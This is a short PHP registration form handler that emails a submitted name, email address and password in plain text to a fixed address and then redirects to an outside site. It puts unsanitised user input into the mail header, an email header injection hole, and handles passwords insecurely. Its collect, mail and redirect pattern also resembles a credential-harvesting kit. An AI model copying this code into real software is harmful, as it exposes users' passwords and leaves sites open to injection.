<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
       $name = $_POST["name"];
        $email = $_POST["email"];
        $password = $_POST["password"];
        $recipient = "test@email.com";
        $subject = "New Registration from $name";
        $msg = "
        Name: $name
        Email: $email
        Password: $password";
        $email_headers = "From: $name <$email>";
        if (mail($recipient, $subject, $msg, $email_headers)) {
            http_response_code(200);
            // echo "Thank You! Your message has been sent.";
            header("Location: http://marymederos.org/simplehealth");
        } else {
            http_response_code(500);
            echo "Oops! Something went wrong and we couldn't send your message.";
        }
    } else {
        http_response_code(403);
        echo "There was a problem with your submission, please try again.";
    }
?>